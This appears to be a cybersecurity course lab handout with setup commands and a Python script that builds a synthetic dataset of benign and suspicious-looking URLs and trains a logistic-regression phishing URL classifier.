+Create outputs folder
+mkdir -p outputs
+(If urls_synthetic.csv is loose, not already inside datasets/)
+mv urls_synthetic.csv datasets/ 2>/dev/null || true
+E) Create the Classifier Script
+Write phishing_url_lab.py with a here-doc
+cat <<'EOF' > phishing_url_lab.py
+F) Verify Environment & Dataset
+Check libraries import
+python -c "import numpy, pandas, sklearn, matplotlib; print('Libraries OK')"
+Check script syntax
+python -m py_compile phishing_url_lab.py
+Peek at the dataset
+head -n 5 datasets/urls_synthetic.csv
+Count rows
+wc -l datasets/urls_synthetic.csv
+G) Train, Evaluate & Interpret
+Run the classifier
+python phishing_url_lab.py run
+wrongly flagged), row 2 = suspicious
+caught),
+Confirm outputs were saved
+head -n 5 outputs/url_test_predictions.csv
+ls -lh outputs/url_confusion.png
+H) Visualize Results & Record Environment
+Open the confusion-matrix image
+xdg-open outputs/url_confusion.png
+Open the predictions CSV
+mousepad outputs/url_test_predictions.csv
+Freeze library versions for reproducibility
+mousepad environment_versions.txt
+python -m pip freeze > environment_versions.txt
+Practical 07, Part E — phishing_url_lab.py
+#!/usr/bin/env python3
+import argparse
+import random
+import sys
+import re
+from pathlib import Path
+from urllib.parse import parse_qs, urlparse
+
+import matplotlib.pyplot as plt
+import numpy as np
+import pandas as pd
+from sklearn.dummy import DummyClassifier
+from sklearn.linear_model import LogisticRegression
+from sklearn.metrics import (accuracy_score, classification_report, confusion_matrix,
+                              ConfusionMatrixDisplay, precision_recall_fscore_support,
+                              roc_auc_score)
+from sklearn.model_selection import train_test_split
+from sklearn.pipeline import make_pipeline
+from sklearn.preprocessing import StandardScaler
+
+BASE = Path(__file__).resolve().parent
+DATA = BASE / "datasets"
+OUT = BASE / "outputs"
+SEED = 42
+URL_COLS = ["url_length", "dots", "hyphens", "digits", "at_sign", "https",
+            "path_depth", "keyword_count", "query_params", "ip_host"]
+KEYWORDS = ["login", "verify", "update", "secure", "account", "billing", "reset"]
+
+
+def ensure_dirs():
+    DATA.mkdir(parents=True, exist_ok=True)
+    OUT.mkdir(parents=True, exist_ok=True)
+
+
+def build_urls():
+    rng = random.Random(SEED)
+    words = ["atlas", "cedar", "harbor", "lotus", "river", "willow", "metro"]
+    brands = ["alpha", "beta", "gamma", "delta"]
+    common = ["products", "support", "catalog", "about", "contact"]
+    records = []
+    for _ in range(400):
+        b, w, n = rng.choice(words), rng.choice(brands), rng.randint(100, 9999)
+        base_styles = [
+            f"https://{w}.example.text/{rng.choice(common)}",
+            f"http://{w}.example.text/index.html",
+            f"http://{w}.{b}.example.text/catalog/item/{n}",
+            f"https://service.{w}.text/contact",
+            f"https://{b}.example.text/login",
+            f"https://{w}.text/account"
+        ]
+        records.append((rng.choice(base_styles), 0))
+    for _ in range(400):
+        b, w, n = rng.choice(words), rng.choice(brands), rng.randint(100, 9999)
+        suspect_styles = [
+            f"http://192.168.1.50/verify-account",
+            f"http://{rng.randint(100,999)}.{rng.randint(1,255)}.org/login",
+            f"http://{w}-verify-{n}.account-test/login?ref={n}",
+            f"https://secure-{b}-{n}.account-test/update/password",
+            f"http://{b}-check-{n}.test/billing/verify?user={n}",
+            f"https://account-support-test/session/{n}",
+            f"http://support-{b}.test/login",
+            f"https://portal-{b}.test/verify"
+        ]
+        records.append((rng.choice(suspect_styles), 1))
+    rng.shuffle(records)
+    return pd.DataFrame(records, columns=["url", "label"])
+
+
+def url_features(url):
+    parsed = urlparse(url)
+    host = parsed.netloc
+    path = parsed.path
+    return [
+        len(url),
+        url.count("."),
+        url.count("-"),
+        sum(c.isdigit() for c in url),
+        int("@" in url),
+        int(parsed.scheme.lower() == "https"),
+        len([p for p in path.split("/") if p]),
+        sum(k in url.lower() for k in KEYWORDS),
+        len(parse_qs(parsed.query)),
+        int(bool(re.fullmatch(r"(?:\d{1,3}\.){3}\d{1,3}", host)))
+    ]
+
+
+def supervised():
+    ensure_dirs()
+    df = pd.read_csv(DATA / "urls_synthetic.csv")
+    X = pd.DataFrame([url_features(u) for u in df["url"]], columns=URL_COLS)
+    y = df["label"].astype(int)
+    X_train, X_test, y_train, y_test = train_test_split(
+        X, y, test_size=0.25, random_state=SEED, stratify=y)
+    baseline = DummyClassifier(strategy="most_frequent").fit(X_train, y_train)
+    model = make_pipeline(StandardScaler(),
+                           LogisticRegression(max_iter=1000, random_state=SEED))
+    model.fit(X_train, y_train)
+    pred_base = baseline.predict(X_test)
+    predicted = model.predict(X_test)
+    probs = model.predict_proba(X_test)[:, 1]
+    base_acc = accuracy_score(y_test, pred_base)
+    acc = accuracy_score(y_test, predicted)
+    prec, rec, f1, _ = precision_recall_fscore_support(y_test, predicted, average="binary")
+    auc = roc_auc_score(y_test, probs)
+    print(f"[SUPERVISED] train {len(X_train)} test {len(X_test)} "
+          f"(100 benign, 100 suspicious)")
+    print(f"[SUPERVISED] baseline accuracy {base_acc:.3f}")
+    print(f"[SUPERVISED] accuracy {acc:.3f} precision {prec:.3f} "
+          f"recall {rec:.3f} f1 {f1:.3f} auc {auc:.3f}")
+    cm = confusion_matrix(y_test, predicted)
+    print("[SUPERVISED] confusion matrix [[TN FP], [FN TP]]:")
+    print(f"[[{cm[0][0]} {cm[0][1]}]]")
+    print(f"[[{cm[1][0]} {cm[1][1]}]]")
+
+    examples = [
+        "https://atlas.example.text/about",
+        "http://alpha-verify-1234.account-test/login?ref=1234",
+        "https://beta.example.text/reset-password"
+    ]
+    feats = pd.DataFrame([url_features(u) for u in examples], columns=URL_COLS)
+    ex_probs = model.predict_proba(feats)[:, 1]
+    for u, p in zip(examples, ex_probs):
+        lbl = "suspicious" if p >= 0.5 else "benign"
+        print(f"[{'SUSP' if lbl=='suspicious' else 'BENIGN'}] P({lbl}) {p:.3f} {u}")
+
+    ConfusionMatrixDisplay.from_predictions(y_test, predicted,
+                                             display_labels=["benign", "suspicious"])
+    plt.title("Synthetic URL classification: test confusion matrix")
+    plt.tight_layout()
+    plt.savefig(OUT / "url_confusion.png", dpi=100)
+    plt.close()
+
+    res = pd.DataFrame({"true_label": y_test.to_numpy(), "pred_label": predicted,
+                         "suspicious_score": probs})
+    res.to_csv(OUT / "url_test_predictions.csv", index=False)
+
+
+def generate():
+    ensure_dirs()
+    df = build_urls()
+    df.to_csv(DATA / "urls_synthetic.csv", index=False)
+    print(f"[GENERATE] urls 800 (400 benign, 400 suspicious)")
+    print(f"[GENERATE] saved synthetic CSV in datasets/")
+
+
+def main():
+    parser = argparse.ArgumentParser(description="offline synthetic ML for cybersecurity lab")
+    parser.add_argument("stage", choices=["generate", "run", "all"],
+                         help="generate dataset, train/evaluate, or do both")
+    args = parser.parse_args()
+
+    if args.stage in ("generate", "all"):
+        generate()
+    if args.stage in ("run", "all"):
+        if not (DATA / "urls_synthetic.csv").is_file():
+            parser.error("missing dataset; run 'python phishing_url_lab.py generate'")
+        supervised()
+        print(f"[SAVED] visualization and CSV results in outputs/")
+
+
+if __name__ == "__main__":
+    main()
+Required input: datasets.zip containing datasets/urls_synthetic.csv. If absent: [VERIFY FROM MANUAL].
